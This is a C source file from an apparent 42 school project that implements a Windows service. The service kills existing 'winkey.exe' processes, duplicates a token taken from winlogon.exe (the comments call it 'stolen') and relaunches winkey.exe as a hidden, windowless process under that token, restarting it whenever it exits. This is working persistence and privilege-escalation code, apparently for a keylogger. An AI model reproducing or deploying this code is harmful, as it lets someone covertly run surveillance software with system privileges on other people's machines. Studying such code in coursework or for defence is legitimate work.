/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service_manager.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/11 13:31:13 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/14 13:38:01 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "svc.h"

	#include <tlhelp32.h>

#pragma endregion

#pragma region "Variables"

	static SERVICE_STATUS			ServiceStatus;
	static SERVICE_STATUS_HANDLE	StatusHandle;
	static PROCESS_INFORMATION		ProcessInfo;
	static BOOL						ProcessRunning;
	static HANDLE					dup_token_handle;

	HANDLE							g_ServiceStopEvent;

#pragma endregion

#pragma region "Methods"

	#pragma region "Process"

		#pragma region "Start"

			// Start the process using winlogon.exe's token
			int StartProcess() {
				STARTUPINFO si;
				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

				if (CreateProcessAsUser(
					dup_token_handle,			// Token stolen from winlogon.exe
					g_WinkeyPath,				// Path to the executable
					NULL,						// No need for av[1] here
					NULL,						// Process security attributes
					NULL,						// Thread security attributes
					FALSE,						// Do not inherit handles
					CREATE_NO_WINDOW,			// Create without a window
					NULL,						// Use parent's environment
					NULL,						// Use current directory
					&si,						// Startup info
					&ProcessInfo				// Process info
				)) ProcessRunning = TRUE; else return (1);

				return (0);
			}

		#pragma endregion

		#pragma region "Close"

			void CloseProcess() {
				if (ProcessRunning && ProcessInfo.hProcess) {
					// Open the termination event that the client process is waiting for
					HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
					if (hEvent) {
						// Signal the event so the client knows it should terminate
						SetEvent(hEvent);
						
						// Wait a reasonable time for the client to exit gracefully
						DWORD waitResult = WaitForSingleObject(ProcessInfo.hProcess, 2000);
						
						// Close the termination event handle
						CloseHandle(hEvent);
						
						// If the process did not exit after waiting, force termination
						if (waitResult == WAIT_TIMEOUT) TerminateProcess(ProcessInfo.hProcess, 0);
					} else TerminateProcess(ProcessInfo.hProcess, 0);
					
					CloseHandle(ProcessInfo.hProcess);
					CloseHandle(ProcessInfo.hThread);
					ProcessRunning = FALSE;
				}
			}

		#pragma endregion

		#pragma region "Kill All"

			int KillAllProcesses(char *name) {
				HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
				PROCESSENTRY32 pe32 = { sizeof(pe32) };

				if (Process32First(handle, &pe32)) do {
					if (!_stricmp(pe32.szExeFile, name)) {
						HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						if (hProc) {
							TerminateProcess(hProc, 0);
							CloseHandle(hProc);
						}
					}
				} while (Process32Next(handle, &pe32));

				CloseHandle(handle);
				return (0);
			}

		#pragma endregion

	#pragma endregion

	#pragma region "Main Loop"

		void MainLoop() {
			// Check if any winkey.exe is running and kill them
			KillAllProcesses("winkey.exe");

			// Check if file winkey.exe exist
			if (!g_WinkeyPath[0]) return;
			DWORD attrs = GetFileAttributes(g_WinkeyPath);
			if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY)) return;

			// Impersonate winlogon.exe token
			if (!(dup_token_handle = impersonate())) return;

			// Start loop
			BOOL keepRunning = TRUE;
			while (keepRunning) {
				// Check if service stop has been requested
				if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0) { keepRunning = FALSE; break; }

				// If the process is already running, check its state
				if (ProcessRunning) {
					DWORD exitCode = 0;
					if (GetExitCodeProcess(ProcessInfo.hProcess, &exitCode)) {
						if (exitCode != STILL_ACTIVE) {
							CloseHandle(ProcessInfo.hProcess);
							CloseHandle(ProcessInfo.hThread);
							ProcessRunning = FALSE;
						} else { Sleep(1000); continue; }
					} else ProcessRunning = FALSE;
				}

				// If we get here, we need to start the process
				if (StartProcess()) return;
			}
		}

	#pragma endregion

	#pragma region "Service"

		#pragma region "Report Status"

			// Report the service status to the Service Control Manager (SCM)
			void ReportStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
				ServiceStatus.dwCurrentState = dwCurrentState;
				ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
				ServiceStatus.dwWaitHint = dwWaitHint;

				SetServiceStatus(StatusHandle, &ServiceStatus);
			}

		#pragma endregion

		#pragma region "Service Control"

			// Handler for service control events (when SCM sends a command)
			VOID WINAPI ServiceCtrl(DWORD dwCtrl) {
				if (dwCtrl == SERVICE_CONTROL_STOP) {
					ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);

					// Signal the event to stop the main loop
					if (g_ServiceStopEvent)  SetEvent(g_ServiceStopEvent);

					// Terminate the process if it's running
					CloseProcess();
				}
			}

		#pragma endregion

		#pragma region "Service Main"

			void WINAPI ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) { (void) dwArgc; (void) lpszArgv;
				// Register the service control handler
				StatusHandle = RegisterServiceCtrlHandler(Name, ServiceCtrl);
				if (StatusHandle == NULL) return;

				// Initialize the service status
				ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
				ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
				ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
				ServiceStatus.dwWin32ExitCode = 0;
				ServiceStatus.dwServiceSpecificExitCode = 0;
				ServiceStatus.dwWaitHint = 0;

				// Create an event to signal service stop
				g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
				if (g_ServiceStopEvent == NULL) { ReportStatus(SERVICE_STOPPED, GetLastError(), 0); return; }
				ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);

				// Manage winkey.exe
				MainLoop();

				CloseProcess();
				CloseHandle(g_ServiceStopEvent);
				ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
			}

		#pragma endregion

	#pragma endregion

#pragma endregion
